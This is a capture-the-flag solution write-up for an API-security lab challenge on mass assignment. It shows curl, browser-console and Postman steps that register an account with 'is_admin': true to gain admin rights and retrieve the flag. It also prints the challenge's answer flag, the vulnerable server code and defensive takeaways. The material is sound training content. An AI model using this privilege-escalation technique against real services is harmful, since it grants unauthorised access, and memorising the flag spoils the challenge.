# Solution — The Mass Assignment

| Field | Value |
|---|---|
| Category | API Security |
| Path | `/api3/` |
| Flag | `flag{inm_m4ss_4ss1gnm3nt_3sc4l4t3s}` |

## Setup

```bash
export BASE="https://10.50.234.208:5001"
# or: export BASE="http://127.0.0.1:5001"
```

Confirm: `curl -s "$BASE/health"` returns `{"ok":true,...}`.

## What you're looking at

Registration builds a user object from raw JSON without a field whitelist.
Sending `"is_admin": true` in the body escalates your privilege.

---

## Option A — Command Line (curl)

### Step 1 — Read the docs

```bash
curl -s "$BASE/api3/docs" | head -40
```

Docs list `username`, `password`, `email` as writable. Model fields
`role`, `permissions`, `is_admin` are described as server-controlled —
a hint that they exist.

### Step 2 — Confirm the flag is admin-only

```bash
TOKEN=$(curl -s -X POST "$BASE/api3/api/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"p","email":"a@b.com"}' | jq -r .token)

curl -s "$BASE/api3/api/admin/flag?task_id=1337" -H "Authorization: Bearer $TOKEN"
```

Expected: `{"error":"forbidden"}`

### Step 3 — Register with `is_admin: true`

```bash
TOKEN=$(curl -s -X POST "$BASE/api3/api/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"p","email":"a@b.com","is_admin":true}' \
  | jq -r .token)
```

### Step 4 — List admin tasks (to confirm privilege)

```bash
curl -s "$BASE/api3/api/tasks" -H "Authorization: Bearer $TOKEN"
```

Expected:

```json
{"tasks":[{"id":1337,"title":"Retrieve audit flag","admin_only":true}, ...]}
```

### Step 5 — Retrieve the flag

```bash
curl -s "$BASE/api3/api/admin/flag?task_id=1337" -H "Authorization: Bearer $TOKEN"
```

Expected: `{"flag":"flag{inm_m4ss_4ss1gnm3nt_3sc4l4t3s}"}`

---

## Option B — Browser (landing page)

The landing page has a registration form, task list, and flag retrieval —
all built in.

### Step 1 — Open the challenge

```
https://<CTFd-Assigned-Host>/api3/
```

### Step 2 — Register a normal user

The **Register** textarea defaults to:

```json
{"username":"attacker","password":"pass","email":"a@b.com"}
```

Click **POST /api/register**. The log shows the response with
`"is_admin": false`. The token auto-fills into the "token" input below.

### Step 3 — Confirm admin access is denied

Click **GET /api/admin/flag**. The log shows `{"error":"forbidden"}`.

### Step 4 — Modify the registration body

Change the **Register** textarea to:

```json
{"username":"attacker2","password":"pass","email":"a@b.com","is_admin":true}
```

Click **POST /api/register** again. The log shows
`"is_admin": true` this time.

### Step 5 — List tasks as admin

Click **GET /api/tasks**. The log shows tasks including
`{"id":1337,"title":"Retrieve audit flag","admin_only":true}`.

### Step 6 — Retrieve the flag

Click **GET /api/admin/flag**. The landing page adds `?task_id=1337`
automatically. The log shows:

```json
{"flag":"flag{inm_m4ss_4ss1gnm3nt_3sc4l4t3s}"}
```

---

## Option C — Browser DevTools Console

### Step 1 — Open `/api3/` and DevTools

Press F12 → **Console**.

### Step 2 — Register with `is_admin: true`

```javascript
const reg = await fetch('/api3/api/register', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'consoleAttacker',
    password: 'p',
    email: 'a@b.com',
    is_admin: true
  })
}).then(r => r.json());
console.log(reg);
```

### Step 3 — Retrieve the flag

```javascript
const flag = await fetch('/api3/api/admin/flag?task_id=1337', {
  headers: { 'Authorization': 'Bearer ' + reg.token }
}).then(r => r.json());
console.log(flag);
```

The console prints the flag.

---

## Option D — Postman Web

1. Go to **https://web.postman.co** and sign in.
2. **Register:** POST `<BASE>/api3/api/register`, Body → raw → JSON:

   ```json
   {"username":"postman","password":"p","email":"a@b.com","is_admin":true}
   ```

   Send. Copy `token` from the response.
3. **Fetch flag:** GET `<BASE>/api3/api/admin/flag?task_id=1337`,
   Headers → `Authorization: Bearer <token>`. Send.

The response contains the flag.

---

## Option E — Browser + an online JSON editor

If you don't want DevTools open:

1. Open `/api3/` in a browser.
2. Open a second tab to a JSON editor like **https://jsoneditoronline.org**.
3. Use it to edit the registration body into valid JSON, then paste it into
   the `/api3/` **Register** textarea and click **POST /api/register**.
4. Follow Step 5–6 of Option B.

---

## Submit

```
flag{inm_m4ss_4ss1gnm3nt_3sc4l4t3s}
```

## Why it works

```python
user = {
    "username": username,
    "password": password,
    "is_admin": bool(data.get("is_admin", False)),   # ← attacker-controlled
    "role": "user",
    "is_superuser": False,
    "permissions": [],
}
```

The developer intended `is_admin` to default to `False`, but reading it
from `data` gave the attacker control. The other fields being hardcoded is
a partial fix that misses the real vulnerability.

## Common dead ends

| Attempt | Result |
|---|---|
| `"role": "admin"` | Ignored |
| `"is_superuser": true` | Ignored |
| `"permissions": ["*"]` | Ignored |
| `"admin": true` | Ignored |
| `"is_admin": true` | ✅ Works |

## Key takeaways

- **Never build a model from raw user input.** Whitelist fields or use a
  schema validator (Pydantic, Marshmallow, DRF Serializer).
- Mixed "hardcoded safe" + "user-controlled" fields is a code smell.
- Exposing `is_admin` in the registration response handed the attacker
  the field name.

## Troubleshooting

| Symptom | Fix |
|---|---|
| `{"error":"username taken"}` | Use a unique username each attempt: `attacker2`, `attacker3`, … |
| `{"error":"forbidden"}` on flag | You used the non-admin token. Redo Step 3–4. |
| `{"error":"task_id required"}` | Add `?task_id=1337` to the URL. |